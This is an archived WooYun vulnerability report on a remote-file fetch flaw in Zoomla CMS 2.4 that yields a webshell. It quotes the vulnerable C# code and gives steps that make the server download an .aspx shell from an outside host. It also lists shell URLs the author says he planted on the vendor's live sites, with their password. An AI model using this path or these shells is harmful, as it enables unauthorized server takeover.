{"id": 19145, "wybug_id": "wooyun-2015-0124696", "wybug_title": "逐浪CMS2.4分分钟GetShell影响尚未发布的2.5Beta版", "wybug_corp": "逐浪CMS", "wybug_author": "Damo", "wybug_date": "2015-07-05 16:28", "wybug_open_date": "2015-07-10 09:39", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Zoomla!逐浪CMS软件由上海逐一软件科技有限公司、江西逐浪软件科技有限公司联袂打造，其旗下华夏互联hx008.com开发团队，是华中排名第一的IDC服务商，拥有近十年的网站开发服务经验，一直以来致力于高端的WEB开发，也是国内领先的TOP外包合作商。作为国产CMS的领先企业和国内首家推出的基于微软公司.NET平台的高端网站内核内容管理系统，Zoomla!逐浪CMS具备八大模块、近百项功能，深得业界好评。在.NET平台开发的CMS行业，Zoomla!逐浪CMS与四川风讯CMS、北京百榕科技、佛山动易软件等公司，引领国产CMS行业的潮流，已成为业界事实标准。截止2012年1月10日，Zoomla!逐浪CMS累计被下载次数达到千万人次，其中与CSDN、ChinaZ中国站长站、华军软件、天空下载等网站合作分流下载，并通过展会光盘赠送、邮件投递、程序员聚会现场发布等方式传达，更为Zoomla!逐浪CMS软件积累了较高的用户群体。建网站，选逐浪。易上手，功能棒。质量好，服务善。高性能，最划算。关键是下载量  是千万 千万次。。。。。。。。 详细说明：  系统版本：Zoomla!CMS2_x2.4问题文件：/Plugins/WebUploader/RemoteImg.aspx辅助文件：http://damotools.apphb.com/getimg.aspx   （测试写的小shell具体shell的作用可以访问该地址下载查看  内容也可以是一句话  ）\nprotected void GetPic_Btn_Click(object sender, EventArgs e)\t{\t\t...略\t\tfor (int i = 0; i < array.Length; i++)\t\t{\t\t\tstring text2 = array[i].ToLower().Replace(\" \", \"\");\t\t\tif (string.IsNullOrEmpty(text2) || (!text2.Contains(\"http\") && !text2.Contains(\"https\")))\t\t\t{\t\t\t\tfunction.WriteErrMsg(\"错误:\" + text2);\t\t\t}\t\t\telse\t\t\t{\t\t\t\tstring text3 = str + this.RemoveChar(Plugins_WebUploader_RemoteImg.GetFNameFromUrl(text2), 1);\t\t\t\t\t\t\t\t/*这个时候text3为文件保存路径，文件名称为 url最后的文件名 例如 http://baidu.com/123.aspx 那么文件名称为123.aspx*/\t\t\t\tPlugins_WebUploader_RemoteImg.DownloadFile(text3, text2, 0, \"temp\");\t\t\t\ttext = text + text3 + \"|\";\t\t\t}\t\t}\t\t略...\t}\n跟踪这个方法Plugins_WebUploader_RemoteImg.DownloadFile\npublic static void DownloadFile(string vpath, string url, int begin = 0, string flag = \"temp\"){\tstring path = function.VToP(vpath);\tint num = 0;\tstring value = \"0\";\tif (File.Exists(path))\t{\t\tSafeC.DelFile(function.PToV(vpath));\t}\tstring directoryName = Path.GetDirectoryName(path);\tif (!Directory.Exists(directoryName))\t{\t\tDirectory.CreateDirectory(directoryName);\t}\tFileStream fileStream = new FileStream(path, FileMode.Create);\ttry\t{\t\tHttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);/*创建web请求*/\t\tHttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();/*获取响应结果*/\t\tlong contentLength = httpWebResponse.ContentLength;/*获取响应数据长度*/\t\tlong num2 = contentLength / 100L;\t\tStream responseStream = httpWebResponse.GetResponseStream();\t\tbyte[] buffer = new byte[1024];\t\tint num3;\t\twhile ((num3 = responseStream.Read(buffer, 0, 1024)) > 0)/*循环读取流中的数据*/\t\t{\t\t\tfileStream.Write(buffer, 0, num3);/*写入数据*/\t\t\tnum += num3;\t\t\tif (!((long)num / num2).ToString().Equals(value))\t\t\t{\t\t\t\tvalue = ((long)num / num2).ToString();\t\t\t}\t\t}\t\tresponseStream.Close();\t}\tcatch (Exception ex)\t{\t\tthrow new Exception(ex.Message);\t}\tfinally\t{\t\tfileStream.Close();\t}}\n利用方式：打开 ：url+/Plugins/WebUploader/RemoteImg.aspx然后在内容框中输入上面的shell远程地址点击确定即可如图：\n\n确定后可能会得到下面的两种结果 第一种为：\n\n第二种：\n\n以上两种均已经成功得到shell地址为：/UploadFiles/2015/07/getimg.aspx?u=Damo文件目录根据日期形成，文件名称请看上面我给代码加的注释。?u=Damo 为了避免百度收录或者别人利用 这里加了一个简单的验证而已   漏洞证明：  官方Demo：一句话地址：http://demo.zoomla.cn/wooyun.aspx  密码wooyun如图：\n\n官网一句话：http://zoomla.cn/wooyun.aspx  密码wooyun\n\n案例：详见官网case   修复方案：  程序员懂   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-10 09:39 厂商回复： 但凡系统总有蜜罐再加二次部署，而此问题实非遗漏，感谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-08 13:54 |    \t\t07@jyhack.com \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | 希望和大家多多交流，多多沟通、)\t\t \n  前排    \n     2015-07-10 10:19 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @逐浪CMS 通过这个我都拿下官网N次Shell了 你们都没发现吗？没发现的话  要蜜罐有毛用？发现的话不修改更有毛用？    \n     2015-07-10 11:06 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  危害等级：无影响厂商忽略    \n     2015-07-10 14:44 |    \t\t07@jyhack.com \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | 希望和大家多多交流，多多沟通、)\t\t \n  无影响。。。官网都沦陷了还无影响！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}